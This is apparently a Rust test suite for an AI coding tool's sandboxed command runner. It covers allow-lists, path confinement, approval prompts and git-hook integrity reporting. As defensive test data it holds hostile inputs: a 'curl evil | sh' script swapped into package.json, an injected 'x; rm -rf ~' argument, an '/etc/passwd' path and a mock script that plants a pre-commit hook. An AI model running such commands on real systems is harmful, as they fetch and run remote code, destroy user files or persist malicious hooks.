//! `run_command` in the host: what is refused before the user is asked.
//! Spec (command-runner, Refusals before start; Approval on every command).

use std::sync::Mutex;

use serde_json::{Value, json};

use super::{exec::Exec, *};
use crate::core::{
    ai::{
        chat::approval::ApprovalAsk,
        jail::{Backend, JailOff, JailSupport},
        tools::registry::{Family, FamilySet},
    },
    layout::PaneId,
};

/// Answers every ask the same way and remembers what it was asked.
struct Asks {
    answer: Decision,
    asked: Mutex<Vec<ApprovalAsk>>,
}

impl Asks {
    fn new(answer: Decision) -> Arc<Self> {
        Arc::new(Self {
            answer,
            asked: Mutex::default(),
        })
    }

    fn asked(&self) -> Vec<ApprovalAsk> {
        self.asked.lock().unwrap().clone()
    }
}

impl Approver for Asks {
    fn ask(&self, _: CallId, ask: &ApprovalAsk) -> BoxFuture<'static, Answer> {
        self.asked.lock().unwrap().push(ask.clone());
        let answer = self.answer;
        async move { answer.into() }.boxed()
    }
}

pub(super) const LANDLOCK: JailSupport = JailSupport::Available {
    backend: Backend::Landlock,
    abi: 3,
};

pub(super) struct World {
    pub(super) _dir: tempfile::TempDir,
    pub(super) home: PathBuf,
    pub(super) proj: PathBuf,
    pub(super) host: Arc<ToolHost>,
}

pub(super) fn key() -> StageKey {
    StageKey::Pane(PaneId::for_test(1))
}

pub(super) fn world_with(exec: impl FnOnce(Exec) -> Exec) -> World {
    // Not in `/tmp`: the sandbox refuses a project in a scratch folder.
    let target = Path::new(env!("CARGO_MANIFEST_DIR")).join("target");
    std::fs::create_dir_all(&target).unwrap();
    let dir = tempfile::Builder::new()
        .prefix("lbx-exec-")
        .tempdir_in(target)
        .unwrap();
    let home = dir.path().canonicalize().unwrap().join("home");
    let proj = home.join("proj");
    std::fs::create_dir_all(&proj).unwrap();
    let exec = exec(Exec::system());
    let host = Arc::new(ToolHost {
        home: Some(home.clone().into()),
        xdg_config_home: None,
        xdg_data_home: None,
        limits: Limits::default(),
        next: AtomicU64::new(1),
        stages: Arc::default(),
        exec,
    });
    World {
        _dir: dir,
        home,
        proj,
        host,
    }
}

fn world() -> World {
    world_with(|exec| Exec {
        jail: Box::new(|| LANDLOCK),
        ..exec
    })
}

fn exec_set() -> FamilySet {
    FamilySet::LEGACY.with(Family::Exec).with(Family::Write)
}

impl World {
    pub(super) fn turn(
        &self,
        origin: &Path,
        approver: Arc<dyn Approver>,
        families: FamilySet,
    ) -> (Arc<dyn Dispatch>, mpsc::Receiver<StreamEvent>) {
        let (tx, rx) = mpsc::channel(32);
        let mut scope = TurnScope::new(tx, Locality::Local, origin.to_path_buf());
        scope.approver = approver;
        scope.families = families;
        scope.stage_key = Some(key());
        (self.host.dispatch(scope), rx)
    }
}

pub(super) fn command(program: &str, args: &[&str], cwd: Option<&str>) -> Call {
    let mut value = json!({"program": program, "args": args});
    if let Some(cwd) = cwd {
        value["cwd"] = Value::from(cwd);
    }
    Call::RunCommand { args: value }
}

/// Runs `call` against a user who declines, and returns the text the model
/// got and whether the user was asked at all.
async fn refused(w: &World, call: Call) -> (String, bool) {
    let asks = Asks::new(Decision::Denied("the user declined"));
    let (d, _rx) = w.turn(&w.proj, asks.clone(), exec_set());
    let out = d.call(call).await;
    assert!(out.is_error, "{out:?}");
    (out.text, !asks.asked().is_empty())
}

// Scenario "No jail": refused, and no prompt opens.
#[tokio::test]
async fn without_a_jail_a_command_is_refused_before_it_asks() {
    for off in [
        JailOff::NoLandlock(2),
        JailOff::NoBackend,
        JailOff::NotProbed,
    ] {
        let w = world_with(|exec| Exec {
            jail: Box::new(move || JailSupport::Unavailable(off)),
            ..exec
        });
        let (text, asked) = refused(&w, command("cargo", &["test"], None)).await;
        assert_eq!(text, "commands need the Linux sandbox (Landlock ABI 3+)");
        assert!(!asked);
    }
}

// Scenario "Off by default": a call without the Exec family is an unknown tool.
#[tokio::test]
async fn without_the_exec_family_the_call_is_an_unknown_tool() {
    let w = world();
    let asks = Asks::new(Decision::Sent);
    let (d, _rx) = w.turn(&w.proj, asks.clone(), FamilySet::LEGACY.with(Family::Write));
    let out = d.call(command("cargo", &["test"], None)).await;
    assert_eq!((out.is_error, out.text.as_str()), (true, "unknown tool"));
    assert!(asks.asked().is_empty());
}

// Scenario "Not on the list" and the verb and flag rules.
#[tokio::test]
async fn the_allow_list_refuses_before_the_ask() {
    let w = world();
    for (call, why) in [
        (command("make", &[], None), "program not allowed"),
        (
            command("/usr/bin/cargo", &["test"], None),
            "program not allowed",
        ),
        (
            command("cargo", &["publish"], None),
            "subcommand not allowed",
        ),
        (
            command("cargo", &["test", "--config", "x"], None),
            "flag not allowed",
        ),
        (
            command("cargo", &["test", "/etc/passwd"], None),
            "path not available",
        ),
    ] {
        assert_eq!(refused(&w, call).await, (why.to_owned(), false));
    }
}

// The scripts of `package.json` decide `yarn run`: read where the command runs.
#[tokio::test]
async fn yarn_run_needs_a_script_declared_in_the_package_json_of_the_folder() {
    let w = world();
    std::fs::create_dir_all(w.proj.join("web")).unwrap();
    std::fs::write(
        w.proj.join("web/package.json"),
        r#"{"scripts": {"build": "tsc"}}"#,
    )
    .unwrap();
    let missing = command("yarn", &["run", "build"], None);
    assert_eq!(
        refused(&w, missing).await,
        ("run it from the folder that has package.json".into(), false)
    );
    let asks = Asks::new(Decision::Denied("the user declined"));
    let (d, _rx) = w.turn(&w.proj, asks.clone(), exec_set());
    let out = d
        .call(command("yarn", &["run", "build"], Some("web")))
        .await;
    assert_eq!(out.text, "denied: the user declined");
    assert_eq!(asks.asked().len(), 1);
}

// Scenario "Cwd outside the root", and the root policy of the chat origin.
#[tokio::test]
async fn a_folder_outside_the_root_and_a_broad_root_are_refused() {
    let w = world();
    std::fs::create_dir_all(w.proj.join("src")).unwrap();
    std::os::unix::fs::symlink(&w.home, w.proj.join("out")).unwrap();
    for cwd in ["..", "/tmp", "out", "missing", "src/../.."] {
        let call = command("cargo", &["test"], Some(cwd));
        assert_eq!(
            refused(&w, call).await,
            ("path not available".into(), false),
            "{cwd}"
        );
    }
    let asks = Asks::new(Decision::Sent);
    for origin in [w.home.clone(), w.home.join("missing"), PathBuf::from("rel")] {
        let (d, _rx) = w.turn(&origin, asks.clone(), exec_set());
        let out = d.call(command("cargo", &["test"], None)).await;
        assert_eq!(out.text, "path not available", "{origin:?}");
    }
    assert!(asks.asked().is_empty());
}

// What the user reads is what runs: text that would not show as it is is refused.
#[tokio::test]
async fn an_argument_that_would_not_show_as_it_is_is_refused() {
    let w = world();
    let call = command("cargo", &["test", "a\u{1b}[2Jb"], None);
    assert_eq!(
        refused(&w, call).await,
        ("command cannot be shown safely".into(), false)
    );
}

// A tab, a newline or any control character would be drawn as something else.
#[tokio::test]
async fn an_argument_with_a_control_character_is_refused() {
    let w = world();
    for bad in ["a\tb", "a\nb", "a\rb", "a\u{7}b", "a\u{0}b"] {
        let call = command("cargo", &["test", bad], None);
        assert_eq!(
            refused(&w, call).await,
            ("command cannot be shown safely".into(), false),
            "{bad:?}"
        );
    }
}

// A command's output can carry secrets and would go to the provider: until the
// `.env` notice (X-d2) lands, commands run only with a local model.
#[tokio::test]
async fn a_cloud_chat_is_refused_before_it_asks() {
    let w = world();
    let asks = Asks::new(Decision::Sent);
    let (tx, _rx) = mpsc::channel(32);
    let mut scope = TurnScope::new(tx, Locality::Cloud, w.proj.clone());
    scope.approver = asks.clone();
    scope.families = exec_set();
    scope.stage_key = Some(key());
    let out = w
        .host
        .dispatch(scope)
        .call(command("cargo", &["test"], None))
        .await;
    assert!(out.is_error, "{out:?}");
    assert_eq!(out.text, "commands run only with a local model for now");
    assert!(asks.asked().is_empty());
}

// Scenario "Unproposed staged changes".
#[tokio::test]
async fn a_chat_with_staged_changes_must_propose_them_first() {
    let w = world();
    let asks = Asks::new(Decision::Denied("the user declined"));
    let (d, _rx) = w.turn(&w.proj, asks.clone(), exec_set());
    let staged = d
        .call(Call::WriteFile {
            path: "a.txt".into(),
            content: "x".into(),
        })
        .await;
    assert!(!staged.is_error, "{staged:?}");
    let out = d.call(command("cargo", &["test"], None)).await;
    assert!(
        out.is_error && out.text.contains("propose them first"),
        "{out:?}"
    );
    assert!(asks.asked().is_empty());
    // Another chat is not affected.
    let (tx, _rx) = mpsc::channel(32);
    let mut scope = TurnScope::new(tx, Locality::Local, w.proj.clone());
    scope.approver = asks.clone();
    scope.families = exec_set();
    scope.stage_key = Some(StageKey::Pane(PaneId::for_test(2)));
    let out = w
        .host
        .dispatch(scope)
        .call(command("cargo", &["test"], None))
        .await;
    assert_eq!(out.text, "denied: the user declined");
}

// Scenario "One run per chat": refused at once, before the prompt.
#[tokio::test]
async fn a_chat_that_is_running_a_command_is_refused_before_it_asks() {
    let w = world();
    let held = w.host.exec.gate.acquire(key()).await.unwrap();
    let (text, asked) = refused(&w, command("cargo", &["test"], None)).await;
    assert_eq!(text, "a command is already running in this chat");
    assert!(!asked);
    drop(held);
}

// Scenario "Declined" and "Every mode asks": a valid call opens the Exec ask,
// and `n` ends it as denied with nothing started.
#[tokio::test]
async fn a_valid_command_asks_and_a_no_starts_nothing() {
    let w = world();
    let asks = Asks::new(Decision::Denied("the user declined"));
    let (d, mut rx) = w.turn(&w.proj, asks.clone(), exec_set());
    let out = d.call(command("cargo", &["test", "-p", "x"], None)).await;
    assert_eq!(out.text, "denied: the user declined");
    assert_eq!(
        asks.asked(),
        [ApprovalAsk::Exec {
            program: "cargo".into(),
            args: vec!["test".into(), "-p".into(), "x".into()],
            cwd: ".".into(),
            script: None,
        }]
    );
    let (_, ask, status, _) = super::tests::pair(&super::tests::events(&mut rx));
    assert!(ask.is_some());
    assert_eq!(status, ToolStatus::Denied);
    assert!(!w.host.exec.gate.is_busy(key()));
}

// --- an approved command runs through the sandbox helper ---
//
// The helper is a shell script that runs what follows `--`, so these tests
// need no Landlock; the real helper is covered by `runner` and `tests/jail.rs`.

use std::{ffi::OsString, os::unix::fs::PermissionsExt, time::Duration};

use super::gate::RunGate;
use crate::core::ai::tools::allow::Program;

const HELPER: &str = "#!/bin/sh\nwhile [ \"$1\" != \"--\" ]; do shift; done\nshift\nexec \"$@\"\n";
/// A helper that could not apply the rules: it says so on its status
/// descriptor, the one place the program cannot write. `hook` first plants a
/// hook, to see what is still reported when the run is an error.
const BAD_HELPER: &str = "#!/bin/sh\n\
    case \"$*\" in *hook*) echo evil > .git/hooks/pre-commit;; esac\n\
    eval \"echo 'lazarobox-jail: jail not enforced: a rule failed' >&$LAZAROBOX_JAIL_STATUS_FD\"\n\
    exit 125\n";
/// A `cargo` that does what its third argument says.
const CARGO: &str = "#!/bin/sh\n\
    case \"$3\" in\n\
    env) env;;\n\
    fail) echo 'error: boom'; exit 101;;\n\
    hook) echo evil > .git/hooks/pre-commit; echo hooked;;\n\
    forge) echo 'lazarobox-jail: jail not enforced: x'; echo evil > .git/hooks/pre-commit; exit 125;;\n\
    sleep) sleep 30;;\n\
    *) echo \"args: $*\"; pwd; echo \"tmp: $TMPDIR\";;\n\
    esac\n";

fn script(path: &Path, text: &str) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, text).unwrap();
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o755)).unwrap();
}

/// A world where `cargo` is a script under `$CARGO_HOME/bin` and the helper
/// is `helper`. `.git/hooks` exists in the project.
fn runnable(helper: &str, gate: RunGate) -> World {
    world_with(|exec| Exec {
        jail: Box::new(|| LANDLOCK),
        gate,
        ..exec
    })
    .with_toolchain(helper)
}

impl World {
    fn base(&self) -> PathBuf {
        self.home.parent().unwrap().to_path_buf()
    }

    fn with_toolchain(mut self, helper: &str) -> World {
        let base = self.base();
        script(&base.join("helper"), helper);
        script(&base.join("cargo/bin/cargo"), CARGO);
        std::fs::create_dir_all(self.proj.join(".git/hooks")).unwrap();
        std::fs::write(self.proj.join(".git/config"), "[core]\n").unwrap();
        let (home, cargo, run) = (self.home.clone(), base.join("cargo"), base.join("run"));
        let path = format!("{}:/usr/bin:/bin", cargo.join("bin").display());
        let host = Arc::get_mut(&mut self.host).unwrap();
        host.exec.helper = Some(base.join("helper"));
        host.exec.read = Arc::new(move |name| match name {
            "PATH" => Some(OsString::from(&path)),
            "HOME" => Some(home.clone().into()),
            "CARGO_HOME" => Some(cargo.clone().into()),
            "XDG_RUNTIME_DIR" => Some(run.clone().into()),
            "SECRET_TOKEN" => Some("hunter2".into()),
            _ => None,
        });
        self
    }

    /// Runs `call` for a user who says `y`.
    async fn run(&self, call: Call) -> (Outcome, Vec<StreamEvent>) {
        let asks = Asks::new(Decision::Sent);
        let (d, mut rx) = self.turn(&self.proj, asks, exec_set());
        let out = d.call(call).await;
        (out, super::tests::events(&mut rx))
    }
}

fn gate() -> RunGate {
    RunGate::new(2, Duration::from_millis(50))
}

fn after_dashes(word: &str) -> Call {
    command("cargo", &["test", "--", word], None)
}

// Scenario "Failure is an outcome", "Output is data", "No shell string": the
// run is an ok result with the exit code and the output wrapped as data.
#[tokio::test]
async fn an_approved_command_runs_in_the_folder_and_its_output_is_data() {
    let w = runnable(HELPER, gate());
    std::fs::create_dir_all(w.proj.join("sub")).unwrap();
    let call = command("cargo", &["test", "--", "x; rm -rf ~"], Some("sub"));
    let (out, events) = w.run(call).await;
    assert!(!out.is_error, "{out:?}");
    assert!(out.text.starts_with("exit code 0 after "), "{}", out.text);
    assert!(
        out.text.contains("<untrusted-tool-output id=\""),
        "{}",
        out.text
    );
    assert!(
        out.text.contains("args: test -- x; rm -rf ~"),
        "{}",
        out.text
    );
    assert!(
        out.text.contains(&format!("{}/sub\n", w.proj.display())),
        "{}",
        out.text
    );
    let (_, _, status, summary) = super::tests::pair(&events);
    assert_eq!(status, ToolStatus::Ok);
    assert!(summary.starts_with("exit code 0"), "{summary}");
    assert!(!w.host.exec.gate.is_busy(key()));
}

// The private TMPDIR is the run's own and is gone after it.
#[tokio::test]
async fn the_private_temp_folder_is_removed_after_the_run() {
    let w = runnable(HELPER, gate());
    let (out, _) = w.run(after_dashes("go")).await;
    let tmp = out
        .text
        .lines()
        .find_map(|l| l.strip_prefix("tmp: "))
        .unwrap();
    assert!(
        tmp.starts_with(&w.base().join("run").display().to_string()),
        "{tmp}"
    );
    assert!(!Path::new(tmp).exists());
}

#[tokio::test]
async fn a_non_zero_exit_is_a_result_and_not_a_tool_error() {
    let w = runnable(HELPER, gate());
    let (out, events) = w.run(after_dashes("fail")).await;
    assert!(!out.is_error, "{out:?}");
    assert!(out.text.starts_with("exit code 101 after "), "{}", out.text);
    assert!(out.text.contains("error: boom"));
    let (_, _, status, _) = super::tests::pair(&events);
    assert_eq!(status, ToolStatus::Ok);
}

// Scenario "Clean environment".
#[tokio::test]
async fn the_child_sees_none_of_the_parents_secrets() {
    let w = runnable(HELPER, gate());
    let (out, _) = w.run(after_dashes("env")).await;
    assert!(out.text.contains("CI=1"), "{}", out.text);
    assert!(!out.text.contains("hunter2") && !out.text.contains("SECRET_TOKEN"));
}

// Scenario "Timeout kills the group" and "Timeout bounds".
#[tokio::test]
async fn a_command_that_outlives_its_timeout_is_killed_and_says_so() {
    let w = runnable(HELPER, gate());
    let call = Call::RunCommand {
        args: json!({"program": "cargo", "args": ["test", "--", "sleep"], "timeout_secs": 1}),
    };
    let started = std::time::Instant::now();
    let (out, _) = w.run(call).await;
    assert!(!out.is_error, "{out:?}");
    assert!(out.text.starts_with("timed out after "), "{}", out.text);
    assert!(started.elapsed() < Duration::from_secs(10));
}

// Scenario "One run per chat" while it runs, and "Cancel kills": dropping the
// call frees the chat.
#[tokio::test]
async fn a_second_call_of_a_running_chat_is_refused_and_a_cancel_frees_it() {
    let w = Arc::new(runnable(HELPER, gate()));
    let first = {
        let w = w.clone();
        tokio::spawn(async move { w.run(after_dashes("sleep")).await })
    };
    for _ in 0..500 {
        if w.host.exec.gate.is_busy(key()) {
            break;
        }
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
    assert!(w.host.exec.gate.is_busy(key()));
    let (second, _) = w.run(after_dashes("go")).await;
    assert!(second.is_error && second.text == "a command is already running in this chat");
    first.abort();
    let _ = first.await;
    assert!(!w.host.exec.gate.is_busy(key()));
}

// Scenario "Global cap": the prompt opens, `y` is given, and with no slot
// free the call is refused after the wait.
#[tokio::test]
async fn with_every_slot_taken_an_approved_command_is_refused_after_the_wait() {
    let w = runnable(HELPER, gate());
    let _a = w
        .host
        .exec
        .gate
        .acquire(StageKey::Pane(PaneId::for_test(8)))
        .await
        .unwrap();
    let _b = w
        .host
        .exec
        .gate
        .acquire(StageKey::Pane(PaneId::for_test(9)))
        .await
        .unwrap();
    let (out, events) = w.run(after_dashes("go")).await;
    assert!(
        out.is_error && out.text.contains("too many commands"),
        "{out:?}"
    );
    let (_, ask, status, _) = super::tests::pair(&events);
    assert!(ask.is_some());
    assert_eq!(status, ToolStatus::Error);
    assert!(!w.host.exec.gate.is_busy(key()));
}

// Integrity (user decision 5B): a hook the run wrote is told, not reverted.
#[tokio::test]
async fn a_hook_written_by_the_run_is_reported_inside_the_data_wrapper() {
    let w = runnable(HELPER, gate());
    let (out, _) = w.run(after_dashes("hook")).await;
    assert!(!out.is_error, "{out:?}");
    assert!(
        out.text.contains("git hooks or config changed"),
        "{}",
        out.text
    );
    assert!(
        out.text.contains("added .git/hooks/pre-commit"),
        "{}",
        out.text
    );
    let wrapped = out
        .text
        .rsplit_once("git hooks or config changed")
        .unwrap()
        .1;
    assert!(
        wrapped.contains("<untrusted-tool-output id=\""),
        "{wrapped}"
    );
    assert!(w.proj.join(".git/hooks/pre-commit").exists());
}

#[tokio::test]
async fn a_run_that_changed_nothing_says_nothing_of_hooks() {
    let w = runnable(HELPER, gate());
    let (out, _) = w.run(after_dashes("go")).await;
    assert!(!out.text.contains("git hooks"), "{}", out.text);
}

// The helper could not apply the rules: not "exit 125" of the program.
#[tokio::test]
async fn a_sandbox_that_was_not_enforced_is_an_error_and_not_an_exit_code() {
    let w = runnable(BAD_HELPER, gate());
    let (out, _) = w.run(after_dashes("go")).await;
    assert!(
        out.is_error && out.text.contains("sandbox could not be applied"),
        "{out:?}"
    );
}

// The marker is the program's own output here: it proves nothing, and the hook
// it planted is still reported (a build script must not hide one this way).
#[tokio::test]
async fn a_program_that_forges_the_marker_and_exits_125_is_a_result_with_its_changes() {
    let w = runnable(HELPER, gate());
    let (out, _) = w.run(after_dashes("forge")).await;
    assert!(!out.is_error, "{out:?}");
    assert!(out.text.starts_with("exit code 125 after "), "{}", out.text);
    assert!(!out.text.contains("sandbox could not be applied"));
    assert!(
        out.text.contains("added .git/hooks/pre-commit"),
        "{}",
        out.text
    );
}

// An error still tells what the run changed before it failed.
#[tokio::test]
async fn a_sandbox_error_still_reports_what_changed() {
    let w = runnable(BAD_HELPER, gate());
    let (out, _) = w.run(after_dashes("hook")).await;
    assert!(
        out.is_error && out.text.contains("sandbox could not be applied"),
        "{out:?}"
    );
    assert!(
        out.text.contains("added .git/hooks/pre-commit"),
        "{}",
        out.text
    );
}

/// The world with `PATH` set to `path` and the usual `$CARGO_HOME`.
fn on_path(w: &mut World, path: String) {
    let (home, run, cargo) = (w.home.clone(), w.base().join("run"), w.base().join("cargo"));
    let host = Arc::get_mut(&mut w.host).unwrap();
    host.exec.read = Arc::new(move |name| match name {
        "PATH" => Some(OsString::from(&path)),
        "HOME" => Some(home.clone().into()),
        "CARGO_HOME" => Some(cargo.clone().into()),
        "XDG_RUNTIME_DIR" => Some(run.clone().into()),
        _ => None,
    });
}

#[tokio::test]
async fn a_program_that_is_not_installed_is_refused() {
    let mut w = runnable(HELPER, gate());
    let path = w.base().join("cargo/bin").display().to_string();
    on_path(&mut w, path);
    let (out, _) = w.run(command("go", &["test"], None)).await;
    assert!(out.is_error && out.text.contains("not found"), "{out:?}");
}

// A `cargo` the sandbox has no toolchain place for (not under `$CARGO_HOME/bin`).
#[tokio::test]
async fn a_program_in_no_known_toolchain_place_is_refused() {
    let mut w = runnable(HELPER, gate());
    script(&w.base().join("elsewhere/cargo"), CARGO);
    let path = w.base().join("elsewhere").display().to_string();
    on_path(&mut w, path);
    let (out, _) = w.run(command("cargo", &["test"], None)).await;
    assert!(
        out.is_error && out.text.contains("not in a place"),
        "{out:?}"
    );
}

// --- which executable a name stands for ---

fn pytest_in(root: &Path) -> Option<PathBuf> {
    exec::find(Program::Pytest, root, None)
}

fn venv_bin(root: &Path) -> PathBuf {
    let bin = root.join(".venv/bin");
    std::fs::create_dir_all(&bin).unwrap();
    bin
}

#[test]
fn the_projects_own_venv_pytest_is_found() {
    let w = world();
    let root = w.proj.canonicalize().unwrap();
    script(&venv_bin(&root).join("pytest"), "#!/bin/sh\n");
    assert_eq!(pytest_in(&root), Some(root.join(".venv/bin/pytest")));
}

// A venv link is a plain file in the project only if its target stays inside.
#[test]
fn a_venv_pytest_that_links_out_of_the_project_is_not_used() {
    let w = world();
    let root = w.proj.canonicalize().unwrap();
    std::os::unix::fs::symlink("/bin/sh", venv_bin(&root).join("pytest")).unwrap();
    assert_eq!(pytest_in(&root), None);
}

#[test]
fn a_venv_pytest_that_links_inside_the_project_is_used() {
    let w = world();
    let root = w.proj.canonicalize().unwrap();
    script(&root.join("tools/real-pytest"), "#!/bin/sh\n");
    std::os::unix::fs::symlink(
        root.join("tools/real-pytest"),
        venv_bin(&root).join("pytest"),
    )
    .unwrap();
    assert_eq!(pytest_in(&root), Some(root.join("tools/real-pytest")));
}

// Refused venv: the search goes on to the PATH.
#[test]
fn a_refused_venv_pytest_falls_through_to_the_path() {
    let w = world();
    let root = w.proj.canonicalize().unwrap();
    std::os::unix::fs::symlink("/bin/sh", venv_bin(&root).join("pytest")).unwrap();
    let bin = w.base().join("bin");
    script(&bin.join("pytest"), "#!/bin/sh\n");
    let found = exec::find(Program::Pytest, &root, Some(bin.as_os_str()));
    assert_eq!(found, Some(bin.join("pytest")));
}

// --- package scripts: shown, declared and pinned ---

fn package(w: &World, scripts: &str) {
    std::fs::write(
        w.proj.join("package.json"),
        format!(r#"{{"scripts": {scripts}}}"#),
    )
    .unwrap();
}

#[tokio::test]
async fn npm_run_needs_a_declared_script_like_yarn_and_pnpm() {
    let w = world();
    package(&w, r#"{"build": "tsc"}"#);
    assert_eq!(
        refused(&w, command("npm", &["run", "deploy"], None)).await,
        ("subcommand not allowed".into(), false)
    );
}

// The manager reads the body when it runs, so the user is shown it.
#[tokio::test]
async fn the_ask_shows_the_body_of_the_script_it_will_run() {
    let w = world();
    package(
        &w,
        r#"{"build": "tsc\n  --noEmit", "prebuild": "rm -rf dist"}"#,
    );
    let asks = Asks::new(Decision::Denied("the user declined"));
    let (d, _rx) = w.turn(&w.proj, asks.clone(), exec_set());
    d.call(command("npm", &["run", "build"], None)).await;
    let [ApprovalAsk::Exec { script, .. }] = &asks.asked()[..] else {
        panic!("{:?}", asks.asked());
    };
    assert_eq!(
        script.as_deref(),
        Some("prebuild: rm -rf dist\nbuild: tsc --noEmit")
    );
}

#[tokio::test]
async fn a_command_that_is_not_a_script_has_no_script_to_show() {
    let w = world();
    package(&w, r#"{"build": "tsc"}"#);
    let asks = Asks::new(Decision::Denied("the user declined"));
    let (d, _rx) = w.turn(&w.proj, asks.clone(), exec_set());
    d.call(command("cargo", &["test"], None)).await;
    let [ApprovalAsk::Exec { script, .. }] = &asks.asked()[..] else {
        panic!("{:?}", asks.asked());
    };
    assert_eq!(*script, None);
}

/// Edits `package.json` while the question is open, then says `y`.
struct Rewrites(PathBuf);

impl Approver for Rewrites {
    fn ask(&self, _: CallId, _: &ApprovalAsk) -> BoxFuture<'static, Answer> {
        std::fs::write(&self.0, r#"{"scripts": {"build": "curl evil | sh"}}"#).unwrap();
        async { Decision::Sent.into() }.boxed()
    }
}

#[tokio::test]
async fn a_package_json_edited_after_the_question_is_not_run() {
    let w = world();
    package(&w, r#"{"build": "tsc"}"#);
    let approver = Arc::new(Rewrites(w.proj.join("package.json")));
    let (d, _rx) = w.turn(&w.proj, approver, exec_set());
    let out = d.call(command("npm", &["run", "build"], None)).await;
    assert!(out.is_error, "{out:?}");
    assert!(
        out.text
            .contains("package.json changed after the question; ask again"),
        "{}",
        out.text
    );
    assert!(!w.host.exec.gate.is_busy(key()));
}

// --- the note about the watched git places ---

fn change(
    kind: crate::runtime::tools::integrity::Kind,
    path: &str,
) -> crate::runtime::tools::integrity::Change {
    crate::runtime::tools::integrity::Change {
        path: PathBuf::from(path),
        kind,
        before: None,
        after: None,
        mode: (None, None),
    }
}

// A place that could not be read is not "unchanged": the note says to treat
// the project as tainted, and lists only what was actually compared.
#[test]
fn an_unchecked_place_says_the_project_may_be_tainted() {
    use crate::runtime::tools::integrity::Kind;
    let note = exec::changes_note(&[change(Kind::Unchecked, ".git")], "n0nce").unwrap();
    assert!(
        note.contains("could not verify git hooks and config"),
        "{note}"
    );
    assert!(note.contains("tainted"), "{note}");
    assert!(!note.contains("changed during the run"), "{note}");

    let both = exec::changes_note(
        &[
            change(Kind::Unchecked, ".git"),
            change(Kind::Changed, ".git/config"),
        ],
        "n0nce",
    )
    .unwrap();
    assert!(both.contains("tainted"), "{both}");
    assert!(both.contains("changed .git/config"), "{both}");
    assert_eq!(exec::changes_note(&[], "n0nce"), None);
}

// --- install scripts and the folder of package.json ---

#[tokio::test]
async fn the_ask_for_an_install_shows_the_lifecycle_scripts_of_the_project() {
    let w = world();
    package(
        &w,
        r#"{"postinstall": "node setup.js", "prepare": "husky", "build": "tsc"}"#,
    );
    for verb in ["install", "ci"] {
        let asks = Asks::new(Decision::Denied("the user declined"));
        let (d, _rx) = w.turn(&w.proj, asks.clone(), exec_set());
        d.call(command("npm", &[verb], None)).await;
        let [ApprovalAsk::Exec { script, .. }] = &asks.asked()[..] else {
            panic!("{:?}", asks.asked());
        };
        assert_eq!(
            script.as_deref(),
            Some("postinstall: node setup.js\nprepare: husky"),
            "{verb}"
        );
    }
}

#[tokio::test]
async fn an_install_with_no_lifecycle_script_shows_no_script() {
    let w = world();
    package(&w, r#"{"build": "tsc"}"#);
    let asks = Asks::new(Decision::Denied("the user declined"));
    let (d, _rx) = w.turn(&w.proj, asks.clone(), exec_set());
    d.call(command("pnpm", &["install"], None)).await;
    let [ApprovalAsk::Exec { script, .. }] = &asks.asked()[..] else {
        panic!("{:?}", asks.asked());
    };
    assert_eq!(*script, None);
}

#[tokio::test]
async fn a_lifecycle_script_edited_while_the_install_question_is_open_is_refused() {
    let w = world();
    package(&w, r#"{"postinstall": "true"}"#);
    let (d, _rx) = w.turn(
        &w.proj,
        Arc::new(Rewrites(w.proj.join("package.json"))),
        exec_set(),
    );
    let out = d.call(command("npm", &["install"], None)).await;
    assert!(
        out.is_error && out.text.contains("package.json changed"),
        "{out:?}"
    );
}

#[tokio::test]
async fn test_and_run_need_the_folder_that_has_package_json() {
    let w = world();
    std::fs::create_dir(w.proj.join("sub")).unwrap();
    package(&w, r#"{"build": "tsc"}"#);
    for args in [&["test"][..], &["run", "build"][..]] {
        for program in ["npm", "yarn", "pnpm"] {
            assert_eq!(
                refused(&w, command(program, args, Some("sub"))).await,
                ("run it from the folder that has package.json".into(), false),
                "{program} {args:?}"
            );
        }
    }
}
